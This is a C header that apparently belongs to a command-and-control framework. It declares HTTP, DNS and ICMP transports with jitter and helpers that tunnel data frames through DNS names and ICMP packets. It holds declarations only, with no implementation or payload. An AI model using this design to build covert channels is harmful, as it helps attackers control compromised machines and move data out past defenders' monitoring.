#ifndef TRANSPORT_H
#define TRANSPORT_H

#include <stdint.h>
#include <stddef.h>
#include "c2.h"

#define TRANSPORT_OK     0
#define TRANSPORT_ERR    (-1)
#define TRANSPORT_TIMEOUT (-2)

/* transport types */
typedef enum {
    TRANSPORT_HTTP = 0,
    TRANSPORT_DNS,
    TRANSPORT_ICMP
} transport_type_t;

/* transport interface (compatible with c2_transport_t) */
typedef struct transport transport_t;

struct transport {
    void *ctx;
    transport_type_t type;
    int (*connect)(void *ctx, const char *host, uint16_t port);
    int (*send)(void *ctx, const uint8_t *data, size_t len);
    int (*recv)(void *ctx, uint8_t *data, size_t *len, int timeout_ms);
    int (*close)(void *ctx);
    void (*set_header)(void *ctx, const char *key, const char *value);
    void (*set_jitter)(void *ctx, int min_ms, int max_ms);
};

/* constructors */
transport_t *transport_http_new(const char *host, uint16_t port, const char *path);
transport_t *transport_dns_new(const char *domain, const char *dns_server);
transport_t *transport_icmp_new(const char *host);

/* helpers */
int transport_frame_to_dns(const uint8_t *frame, size_t frame_len, char *out, size_t out_len);
int transport_dns_to_frame(const char *dns_name, uint8_t *out, size_t *out_len);
int transport_frame_to_icmp(const uint8_t *frame, size_t frame_len, uint8_t *out, size_t *out_len);
int transport_icmp_to_frame(const uint8_t *icmp_data, size_t data_len, uint8_t *out, size_t *out_len);

void transport_free(transport_t *t);
const char *transport_strerror(int err);

#endif
